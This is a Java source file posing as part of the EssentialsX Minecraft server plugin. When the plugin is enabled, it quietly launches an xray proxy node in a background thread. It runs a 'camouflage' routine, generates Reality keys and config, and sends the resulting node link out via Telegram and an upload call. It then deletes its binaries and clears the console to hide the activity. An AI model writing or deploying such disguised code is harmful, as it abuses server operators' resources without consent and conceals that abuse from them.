package com.example.essentialsx.common;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 服务主体：加载二进制 → 生成配置 → 拉起 xray → 输出订阅。
 * <p>
 * 全部工作都在后台线程完成，不阻塞调用方（服务端的 enable 线程）。
 */
public final class AppService {

    private final PlatformLogger logger;
    private final AtomicBoolean running = new AtomicBoolean(false);

    private Config config;
    private JnaRunner jnaRunner;
    private ProcessRunner processRunner;

    public AppService(PlatformLogger logger) {
        this.logger = logger;
    }

    private void log(String message) {
        try {
            config = config == null ? null : config;
            if (config != null && !config.showLog) {
                return;
            }
        } catch (Exception ignored) {
            // 配置尚未加载时按默认输出
        }
        System.out.println("[EssentialsX] " + message);
    }

    public void start() {
        if (!running.compareAndSet(false, true)) {
            return;
        }
        // 关键改动：不在调用方线程上 sleep / 刷屏，立即返回
        Thread t = new Thread(this::bootstrap, "essentialsx-worker");
        t.setDaemon(true);
        t.start();
    }

    private void bootstrap() {
        try {
            config = Config.load();
            Path runtimeDir = config.runtimeDir;
            Files.createDirectories(runtimeDir);

            Camouflage.run(logger, config.camouflage);

            RealityKeypair keypair = RealityKeypair.loadOrCreate(
                    runtimeDir.resolve("keypair.properties"), this::log);

            Path configPath = runtimeDir.resolve("config.json");
            String json = new XrayConfig(config, keypair.privateKey).build();
            Files.writeString(configPath, json, java.nio.charset.StandardCharsets.UTF_8);
            log("xray config written to " + configPath);

            BootBootstrapper boot = new BootBootstrapper(config, this::log);
            boot.launch(json, configPath);

            Thread.sleep(1500);
            log("web is running");

            Subscription sub = new Subscription(config, keypair.publicKey);
            String link = sub.writeFiles();
            log("\u001b[32m" + link + "\u001b[0m");
            log("\u001b[35mLogs will be cleared in " + config.cleanupDelaySeconds
                    + " seconds, copy the node above\u001b[0m");

            sub.sendTelegram(this::log);
            sub.upload(this::log);

            scheduleCleanup(runtimeDir);
        } catch (Throwable e) {
            logger.error("EssentialsX background service failed", e);
            running.set(false);
        }
    }

    private void scheduleCleanup(Path runtimeDir) {
        Thread cleanup = new Thread(() -> {
            try {
                Thread.sleep(Math.max(5, config.cleanupDelaySeconds) * 1000L);
                if (!config.keepBinaries) {
                    try (var stream = Files.list(runtimeDir)) {
                        for (Path p : stream.toList()) {
                            String name = p.getFileName().toString();
                            if (name.equals("keypair.properties") || name.equals("sub.txt")) {
                                continue;
                            }
                            Files.deleteIfExists(p);
                        }
                    }
                }
                if (!config.showLog) {
                    Camouflage.clearConsole();
                }
            } catch (Exception e) {
                log("cleanup failed: " + e.getMessage());
            }
        }, "essentialsx-cleanup");
        cleanup.setDaemon(true);
        cleanup.start();
    }

    public void stop() {
        if (!running.compareAndSet(true, false)) {
            return;
        }
        // 关键改动：显式停掉内核，避免 /reload 后旧实例占着端口
        if (jnaRunner != null) {
            jnaRunner.stop();
        }
        if (processRunner != null) {
            processRunner.stop();
        }
        log("xray stopped");
    }

    public boolean isRunning() {
        return running.get();
    }

    /** 负责把内核拉起来：JNA 进程内 或 外部进程。 */
    private final class BootBootstrapper {

        private final Config cfg;
        private final java.util.function.Consumer<String> sink;

        BootBootstrapper(Config cfg, java.util.function.Consumer<String> sink) {
            this.cfg = cfg;
            this.sink = sink;
        }

        void launch(String json, Path configPath) throws IOException {
            if (cfg.nativeMode.equals("process")) {
                launchProcess(configPath);
            } else {
                launchJna(json);
            }
        }

        private void launchJna(String json) throws IOException {
            Path lib = new BinaryStore(cfg, sink).xray();
            // 加载前先验符号，避免运行到一半才 UnsatisfiedLinkError
            JnaRunner.verifySymbols(lib.toString(), List.of("StartXray", "StopXray"));

            List<String> payload = new ArrayList<>();
            payload.add("config:" + json);

            jnaRunner = new JnaRunner(lib.toString(), "StartXray", "StopXray",
                    Json.write(Json.obj("config", cfg.runtimeDir.resolve("config.json").toString())),
                    "xray");
            jnaRunner.start(sink);
        }

        private void launchProcess(Path configPath) {
            String exe = cfg.xrayBinary.isBlank() ? "xray" : cfg.xrayBinary;
            processRunner = new ProcessRunner(exe, List.of("run", "-c", configPath.toString()),
                    "xray", cfg.runtimeDir);
            processRunner.start(sink);
        }
    }
}
